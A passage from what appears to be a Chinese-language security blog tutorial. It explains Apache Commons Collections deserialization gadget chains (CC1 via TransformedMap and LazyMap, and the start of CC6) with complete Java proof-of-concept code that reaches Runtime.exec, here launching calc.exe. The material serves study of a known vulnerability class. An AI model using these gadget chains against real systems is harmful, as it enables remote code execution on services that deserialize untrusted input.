class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line"><span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">transformerChain);</span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用Transformer[]定义了transformers接口，transformers接收两个参数，分别为ConstantTransformer(构造函数时传入对象并返回该对象)，InvokerTransformer(执行任意方法)。</p><ul><li>InvokerTransformer接收三个参数，命令执行方法，函数参数类型，参数列表。参数类型参照前面的exec不同构造构造函数。这里选择的String.class也就是字符对象。</li></ul><ul><li>InvokerTransformer用getClass，getMethod后用invoke执行了方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure><p>ChainedTransformer将前一个回调返回结果作为后一个回调参数，现在你就知道了为什么transformers定义时传入了两个对象了，getRuntime获取的对象经过ConstantTransformer返回后作为参数传到InvokerTransformer里。因为Runtime里才有exec方法</p><p>而decorate方法是获取一个TransformedMap对象，当TransformedMap内的key和value变化时就会触发Transformer的transform()方法。 在这里也就是把transformerChain绑定在value或者key上。后续put进新元素时会改变transformvalue或者key进而触发反序列化链。</p><p>触发过程：put新元素触发hashmap的反序列化，并且transformChain开始生成runtime对象，exec执行</p><p>但是现实环境几乎没有能直接put元素的环境。需要在java原生环境找到put类操作，也就是sun.reflect.annotation.AnnotationInvocationHandler。AnnotationInvocationHandler的readObject方法里有memberValue.setValue()，在序列化时会直接触发。所以只需要把Map传进去就行了。但是这个方法是私有的，还需要反射获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure><p>由于网络传输需要用字节流而不是字符流，就需要先ByteOutputStream创建字节数组缓存区，再创建对象的序列化流后用writeObject写入序列化流。</p><p>但是执行不了，上述代码对象是由Runtime.getRuntime()实例化对象方法直接生成的。继承的是Runtime的方法，但是该类下没有serializable接口进行序列化。从开篇提的class反射生成的类具有serializable接口，所以这里要借助class进行反射。(对象具有serializable接口才能反序列化，而反序列化是从readObject入口)</p><p>所以反序列化链为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">        <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> newChainedTransformer(transformers);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    innerMap.put(<span class="string">&quot;godown&quot;</span>,<span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">    oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实到这里逻辑上已经很合理了。但是还没有解释为什么反射生成AnnotationInvocationHandler对象obj的时候向构造函数传的参是Retention.class。这是因为在通往setValue的时候遇到了问题，在AnnotationInvocationHandler的readObject时需要经过一个if判断才能继续setValue。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line"><span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过这个if判断的条件就是</p><p>​1.AnnotationInvocationHandler构造函数第一个参数是Annotation子类且包含至少一个方法，假设为X。</p><p>​2.TransformedMap.decorate绑定的Map中有一个X元素</p><p>Retention.class就符合子类和至少一个方法的条件。方法叫value，所以<code>innerMap.put(&quot;value&quot;,&quot;buruheshen&quot;);</code></p><p>完整payload就是改一下put元素,在最后readobject序列化对象触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">                construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">                oos.writeObject(obj);</span><br><span class="line">                oos.close();</span><br><span class="line"></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是测试图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221118220422652.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221118220422652.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221118220422652"></p><h2 id="LazyMap-反序列化链"><a href="#LazyMap-反序列化链" class="headerlink" title="$LazyMap$反序列化链"></a>$LazyMap$反序列化链</h2><p>上述反序列化链是由TransformMap搭配AnnotationInvocationHandler的readObject修改Map触发，其中最后一步就是setValue。不通过setValue触发也是可以的捏。</p><p>LazyMap.decorate绑定的Map，在get找不到值时会触发transform。AnnotationInvocationHandler有setValue但是没有get方法，不过该类下的invoke方法有get调用。用到<code>java.reflect.Proxy</code>触发Invoke。而触发的具体原理可以参考：<code>https://www.jianshu.com/p/774c65290218</code>。理解不了也没事，只需要知道Proxy代理能触发重写的InvocationHandler。</p><p> <img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119120313598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119120313598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221119120313598"></p><p>LazyMap的CC链反序列化流程：</p><ol><li><p>transfromChain的链一样，绑定到lazyMap上。</p><p><code>Map outerMap = LazyMap.decorate(innerMap, transformerChain);</code></p></li><li><p>反射得到AnnotationInvocationHandler构造函数，传入outMap实例化对象。调用outMap需要get获取值</p></li><li><p>借助proxy对象代理，自动调用AnnotationInvocationHandler的invoke的get方法。</p></li></ol><p>上述代码只需要修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class,outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>最后要再实例化的原因是入口点是AnnotationInvocationHandler的readObject，而proxy是Map对象，入口不对</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119135414510.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119135414510.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221119135414510"></p><p>正常执行是没问题的，但是在调试时可能会弹两遍甚至是三遍计算器。根据上面的对象代理知道Proxy代理了map对象(Map proxyMap定义后)，执行一遍map就会触发一遍payload。可以学习ysoserial先new ChainedTransformer假数组，最后再利用getDeclaredField获取私有方法iTransformers，把真正的Transformer数组设置进去</p><p>完整的poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);<span class="comment">//先绑定假transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class,outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,handler);</span><br><span class="line">        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高版本CC6"><a href="#高版本CC6" class="headerlink" title="高版本CC6"></a>高版本CC6</h2><p>再想一遍cc1利用AnnotationInvocationHandler的原因，是因为AnnotationInvocationHandler可以put或者get原map对象，从而触发transform。在高版本时进行了修复，该类的readObject复制了一份linkedHashMap对象，而不是直接用传入的对象，自然也就不能触发transform</p><p>那就直接不用AnnotationInvocationHandler了，他不给我们用就不惯着它，在<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>中hashcode调用了getValue方法，getValue调用了map.get。所以只需要找到hashcode的调用</p><ul><li><p>ysoserial是⽤<code>java.util.HashSet#readObject</code>到<code>HashMap#put()</code>到 <code>HashMap#hash(key)</code>最后到 <code>TiedMapEntry#hashCode()</code></p></li><li><p>p神是<code>java.util.HashMap#readObject</code> 到<code> HashMap#hash()</code>到<code>TiedMapEntry#hashCode()</code></p></li></ul><p>HashMap的部分内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="type">int</span> h;</span><br><span class="line">     <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">         <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">         <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">         <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">         <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">         putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>readObject调用了hash(key)，hash(key)又调用了hashcode。所以key&#x3D;&#x3D;TieMapEntry对象时，构成Gadget</p><p>构造反序列化链流程：</p><ol><li><p>构造lazyMap，和前面的lazyMap一样</p><p><code>Map outerMap = LazyMap.decorate(innerMap, transformerChain);</code></p></li><li><p>把lazyMap的对象作为TieMapEntry的map属性，放入构造函数</p><p><code>TiedMapEntry tme = new TiedMapEntry(outerMap, 